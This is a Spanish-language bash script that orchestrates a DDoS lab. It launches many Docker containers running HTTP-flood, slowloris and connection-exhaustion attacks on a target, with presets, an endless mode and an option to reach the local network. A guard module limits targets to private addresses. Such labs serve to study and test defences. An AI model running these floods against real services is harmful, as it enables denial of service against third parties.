#!/usr/bin/env bash
# Orquestador de ataque del laboratorio.
#
#   scripts/attack.sh --dns victima.local --port 8000 \
#                     --requests 100 --every 1 --containers 3 --forever
#
# Cada contenedor lanza rafagas de N peticiones cada S segundos, desde su propia
# IP de origen, y repite hasta Ctrl+C con --forever.
set -euo pipefail

LAB_HOME="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$LAB_HOME"

HOST=""
PORT=""
ATTACK_PATH="/"
VECTOR="http"
CONTAINERS=1
REQUESTS=50
EVERY=1
DURATION=30
FOREVER=0
PRESET=""
DRY_RUN=0
USE_LAN=0
DNS_SERVER=""
declare -a RESOLVE_MAP=()

usage() {
  cat <<'USAGE'
uso: scripts/attack.sh --dns HOST --port PUERTO [opciones]

  --dns HOST         nombre DNS (o IP) del destino            [obligatorio]
  --port PUERTO      puerto del destino                        [obligatorio]
  --requests N       peticiones por rafaga y contenedor        (def. 50)
  --every S          segundos entre rafagas                    (def. 1)
  --forever          no termina hasta Ctrl+C
  --duration S       duracion total si no es --forever         (def. 30)
  --containers N     contenedores atacantes (sin tope)         (def. 1)
  --vector V         http | slowloris | conn | mixed           (def. http)
  --path RUTA        ruta HTTP a solicitar                     (def. /)
  --preset P         light | medium | hard
  --lan              permite salir a la red local (docker-compose.lan.yml)
  --dns-server IP    servidor DNS que usan los contenedores
  --resolve N=IP     fija el nombre N a la IP indicada (repetible)
  --dry-run          muestra el plan sin lanzar nada

ejemplos:
  scripts/attack.sh --dns victima.local --port 8000 --requests 100 --every 1 --forever
  scripts/attack.sh --dns target --port 8000 --requests 200 --every 0.5 --containers 4 --duration 20

  # dominio con contexto, resuelto por tu DNS local hacia una IP del lab
  scripts/attack.sh --dns victima.midominio.lab --port 8000 \
                    --dns-server 172.28.0.1 --requests 100 --every 1 --forever

  # mismo caso, sin servidor DNS: fija el nombre a la IP de la victima
  scripts/attack.sh --dns victima.midominio.lab --port 8000 \
                    --resolve victima.midominio.lab=172.28.0.2 --requests 100 --every 1

Solo se permiten destinos de red local (RFC1918, loopback, link-local).
USAGE
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    --dns|--target) HOST="${2:?falta valor}"; shift 2 ;;
    --port)         PORT="${2:?falta valor}"; shift 2 ;;
    --path)         ATTACK_PATH="${2:?falta valor}"; shift 2 ;;
    --vector)       VECTOR="${2:?falta valor}"; shift 2 ;;
    --containers)   CONTAINERS="${2:?falta valor}"; shift 2 ;;
    --requests)     REQUESTS="${2:?falta valor}"; shift 2 ;;
    --every)        EVERY="${2:?falta valor}"; shift 2 ;;
    --duration)     DURATION="${2:?falta valor}"; shift 2 ;;
    --preset)       PRESET="${2:?falta valor}"; shift 2 ;;
    --dns-server)   DNS_SERVER="${2:?falta valor}"; shift 2 ;;
    --resolve)      RESOLVE_MAP+=("${2:?falta valor}"); shift 2 ;;
    --forever)      FOREVER=1; shift ;;
    --lan)          USE_LAN=1; shift ;;
    --dry-run)      DRY_RUN=1; shift ;;
    -h|--help)      usage; exit 0 ;;
    *) echo "opcion desconocida: $1" >&2; usage; exit 1 ;;
  esac
done

case "$PRESET" in
  "") ;;
  light)  REQUESTS=25;  EVERY=1 ;;
  medium) REQUESTS=100; EVERY=1 ;;
  hard)   REQUESTS=250; EVERY=1 ;;
  *) echo "preset invalido: $PRESET (light|medium|hard)" >&2; exit 1 ;;
esac

if [[ -z "$HOST" || -z "$PORT" ]]; then
  echo "faltan --dns y --port" >&2
  usage
  exit 1
fi

# Acepta "host:puerto" en --dns y tambien IP.
if [[ "$HOST" == *:* ]]; then
  HOST_ONLY="${HOST%:*}"
  HOST_PORT="${HOST##*:}"
  HOST="$HOST_ONLY"
  [[ "$HOST_PORT" =~ ^[0-9]+$ ]] && PORT="$HOST_PORT"
fi

case "$VECTOR" in
  http|slowloris|conn) ;;
  mixed) [[ $CONTAINERS -lt 3 ]] && CONTAINERS=3 ;;
  *) echo "vector invalido: $VECTOR" >&2; exit 1 ;;
esac

if ! [[ "$CONTAINERS" =~ ^[0-9]+$ ]] || (( CONTAINERS < 1 )); then
  echo "--containers debe ser un entero >= 1" >&2; exit 1
fi
if ! [[ "$PORT" =~ ^[0-9]+$ ]] || (( PORT < 1 || PORT > 65535 )); then
  echo "--port invalido: $PORT" >&2; exit 1
fi

# --- overlay temporal para DNS propio o nombres fijados ----------------------
COMPOSE_FILES=(-f docker-compose.yml)
(( USE_LAN )) && COMPOSE_FILES+=(-f docker-compose.lan.yml)

OVERRIDE_DIR="$(mktemp -d)"
OVERRIDE_FILE="$OVERRIDE_DIR/loadgen-override.yml"
if [[ -n "$DNS_SERVER" ]] || (( ${#RESOLVE_MAP[@]} > 0 )); then
  {
    echo "services:"
    echo "  loadgen:"
    if [[ -n "$DNS_SERVER" ]]; then
      echo "    dns:"
      echo "      - $DNS_SERVER"
    fi
    if (( ${#RESOLVE_MAP[@]} > 0 )); then
      echo "    extra_hosts:"
      for entry in "${RESOLVE_MAP[@]}"; do
        if [[ "$entry" != *=* ]]; then
          echo "formato invalido en --resolve: '$entry' (usa NOMBRE=IP)" >&2
          exit 1
        fi
        echo "      - \"${entry%%=*}:${entry#*=}\""
      done
    fi
  } >"$OVERRIDE_FILE"
  COMPOSE_FILES+=(-f "$OVERRIDE_FILE")
  echo "[dns] overlay: $OVERRIDE_FILE"
fi

# --- validacion del destino dentro de la red del lab (falla rapido) ----------

docker compose "${COMPOSE_FILES[@]}" --profile attack build loadgen >/dev/null 2>&1

VALIDATION_ERR="$(mktemp)"
if ! VALIDATION_OUT="$(docker compose "${COMPOSE_FILES[@]}" --profile attack run --rm --no-deps \
      -e "TARGET_HOST=$HOST" -e "TARGET_PORT=$PORT" loadgen -c '
import os
import sys
from guard import GuardError, parse_target, resolve

try:
    host, port = parse_target(os.environ["TARGET_HOST"], int(os.environ["TARGET_PORT"]))
    ip = resolve(host, port)
except GuardError as exc:
    print(f"[abortado] {exc}")
    raise SystemExit(2)

print(f"[ok] {host}:{port} -> {ip}")
' 2>"$VALIDATION_ERR")"; then
  [[ -n "${VALIDATION_OUT:-}" ]] && echo "$VALIDATION_OUT" >&2
  grep -vE "^ ?Container " "$VALIDATION_ERR" >&2 || true
  rm -f "$VALIDATION_ERR"
  echo "[abortado] destino no valido; no se lanza nada" >&2
  exit 2
fi
rm -f "$VALIDATION_ERR"
echo "$VALIDATION_OUT"

# --- plan ---------------------------------------------------------------------
declare -a WORK_VECTOR=()
for ((i = 0; i < CONTAINERS; i++)); do
  case "$VECTOR" in
    mixed)
      case $((i % 3)) in
        0) WORK_VECTOR+=("http") ;;
        1) WORK_VECTOR+=("slowloris") ;;
        2) WORK_VECTOR+=("conn") ;;
      esac
      ;;
    *) WORK_VECTOR+=("$VECTOR") ;;
  esac
done

UNITS="$REQUESTS peticiones"
[[ "$VECTOR" == "slowloris" ]] && UNITS="$REQUESTS sockets"
[[ "$VECTOR" == "conn" ]] && UNITS="$REQUESTS conexiones"

echo "=============================================================="
echo "  DESTINO     : $HOST:$PORT$ATTACK_PATH"
echo "  PATRON      : $UNITS cada ${EVERY}s por contenedor"
echo "  MODO        : $([[ $FOREVER -eq 1 ]] && echo 'INFINITO (Ctrl+C)' || echo "${DURATION}s")"
echo "  CONTENEDORES: $CONTAINERS"
echo "  VECTOR      : $VECTOR"
echo "  RED         : $([[ $USE_LAN -eq 1 ]] && echo 'lab + LAN' || echo 'solo lab (aislada)')"
if [[ -n "$DNS_SERVER" ]]; then
  echo "  DNS SERVER  : $DNS_SERVER"
fi
if (( ${#RESOLVE_MAP[@]} > 0 )); then
  echo "  RESOLVE     : ${RESOLVE_MAP[*]}"
fi
echo "=============================================================="
for ((i = 0; i < CONTAINERS; i++)); do
  echo "  w$i -> ${WORK_VECTOR[$i]}"
done

if (( DRY_RUN )); then
  echo "(dry-run: no se lanza nada)"
  exit 0
fi

if ! docker compose ps --status running --services 2>/dev/null | grep -qx target; then
  echo "la victima no esta levantada. Ejecuta 'make up'." >&2
  exit 1
fi

# --- preparacion --------------------------------------------------------------
# (COMPOSE_FILES ya se definio al validar el destino)

RUN_ID="$(date +%s)"
LOG_DIR="${TMPDIR:-/tmp}/opencode/ddos-lab-${RUN_ID}"
mkdir -p "$LOG_DIR"

declare -a PIDS=()
declare -a NAMES=()
declare -a CIDS=()

cleanup() {
  local i cid
  # SIGINT primero: el generador cierra, imprime su resumen y sale limpio.
  for cid in "${CIDS[@]:-}"; do
    [[ -n "$cid" ]] && docker kill -s INT "$cid" >/dev/null 2>&1 || true
  done
  sleep 2
  # Los contenedores se lanzan en segundo plano: sus logs siguen disponibles
  # aunque el cliente de este script haya muerto con el Ctrl+C.
  for i in "${!CIDS[@]}"; do
    cid="${CIDS[$i]}"
    [[ -n "$cid" ]] || continue
    docker logs "$cid" >"$LOG_DIR/w${i}.log" 2>&1 || true
    docker rm -f "$cid" >/dev/null 2>&1 || true
  done
  [[ -n "${OVERRIDE_DIR:-}" ]] && rm -rf "$OVERRIDE_DIR"
}

interrupted=0
on_signal() {
  [[ $interrupted -eq 1 ]] && return
  interrupted=1
  echo
  echo "[*] deteniendo contenedores..."
  cleanup
  wait 2>/dev/null || true
}
trap on_signal INT TERM
trap cleanup EXIT

args_for() {
  local vec="$1"
  case "$vec" in
    http)
      local extra=()
      (( FOREVER )) && extra+=(--forever) || extra+=(--duration "$DURATION")
      printf '%s\0' http_flood.py --dns "$HOST" --port "$PORT" --path "$ATTACK_PATH" \
        --requests "$REQUESTS" --every "$EVERY" "${extra[@]}"
      ;;
    slowloris)
      local extra=()
      (( FOREVER )) && extra+=(--forever) || extra+=(--duration "$DURATION")
      printf '%s\0' slowloris.py --dns "$HOST" --port "$PORT" \
        --sockets "$REQUESTS" "${extra[@]}"
      ;;
    conn)
      local extra=()
      (( FOREVER )) && extra+=(--forever) || extra+=(--duration "$DURATION")
      printf '%s\0' conn_exhaust.py --dns "$HOST" --port "$PORT" \
        --connections "$REQUESTS" "${extra[@]}"
      ;;
  esac
}

echo
echo "[*] lanzando $CONTAINERS contenedor(es) · logs en $LOG_DIR"
for ((i = 0; i < CONTAINERS; i++)); do
  local_vec="${WORK_VECTOR[$i]}"
  mapfile -d '' -t ARGS < <(args_for "$local_vec")
  NAME="ddoslab-w${i}-${RUN_ID}"
  NAMES+=("$NAME")
  CID="$(docker compose "${COMPOSE_FILES[@]}" --profile attack run -d --no-deps \
    --name "$NAME" loadgen "${ARGS[@]}" 2>/dev/null | tail -n1 || true)"
  if [[ -z "$CID" ]]; then
    echo "  [!] no se pudo crear w$i" >&2
    continue
  fi
  CIDS+=("$CID")
  (
    docker logs -f "$CID" 2>&1 \
      | sed -u "s/^/[w${i}] /" \
      | tee "$LOG_DIR/w${i}.log"
  ) &
  PIDS+=("$!")
done

if (( ${#CIDS[@]} == 0 )); then
  echo "[!] no se lanzo ningun contenedor" >&2
  exit 1
fi

echo "[*] en marcha. Ctrl+C para parar."
wait || true

if (( interrupted )); then
  echo "[*] detenido"
fi

# --- agregacion ---------------------------------------------------------------
python3 - "$LOG_DIR" "$CONTAINERS" "$HOST" "$PORT" "$ATTACK_PATH" <<'PY'
import json
import os
import sys
from collections import defaultdict

log_dir, n, host, port, path = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], sys.argv[5]

workers = []
for i in range(n):
    file = os.path.join(log_dir, f"w{i}.log")
    payload, note = None, ""
    if os.path.exists(file):
        for line in open(file, errors="replace"):
            if "RESULT:" in line:
                try:
                    payload = json.loads(line.split("RESULT:", 1)[1])
                except json.JSONDecodeError:
                    note = "resultado ilegible"
            elif "[abortado]" in line:
                note = line.split("[abortado]", 1)[1].strip()
    if payload is None and not note:
        note = "sin resultado (contenedor detenido antes de cerrar)"
    workers.append({"id": i, "result": payload, "note": note})

print("\n" + "=" * 66)
print("  RESUMEN")
print("=" * 66)
print(f"  destino       : {host}:{port}{path}")
print(f"  contenedores  : {n}")

http = [w for w in workers if w["result"] and w["result"].get("kind") == "http"]
if http:
    codes = defaultdict(int)
    total = 0
    for w in http:
        total += w["result"]["received"]
        for code, count in w["result"]["codes"].items():
            codes[code] += count
    print(f"  peticiones    : {total}")
    print("  respuestas    :")
    for code in sorted(codes, key=lambda c: (c == "0", c)):
        label = "sin respuesta / reset" if code == "0" else code
        pct = codes[code] * 100 / total if total else 0
        print(f"    {label:>22} : {codes[code]:7d}  ({pct:5.1f} %)")
    for w in http:
        r = w["result"]
        print(f"    w{w['id']}: {r['bursts']:>4} rafagas · {r['received']:>6} peticiones"
              f" · {r['duration_s']}s")

slow = [w for w in workers if w["result"] and w["result"].get("kind") == "slowloris"]
if slow:
    print(f"  slowloris     : {sum(r['result']['opened'] for r in slow)} sockets · "
          f"{sum(r['result']['closed_by_peer'] for r in slow)} cerrados por el destino")

conn = [w for w in workers if w["result"] and w["result"].get("kind") == "conn"]
if conn:
    print(f"  cola TCP      : {sum(r['result']['opened'] for r in conn)} conexiones · "
          f"{sum(r['result']['closed_by_peer'] for r in conn)} cerradas por el destino")

broken = [w for w in workers if w["result"] is None]
if broken:
    print("\n  incidencias:")
    for w in broken:
        print(f"    w{w['id']}: {w['note']}")
print()
PY

echo "[*] logs: $LOG_DIR"
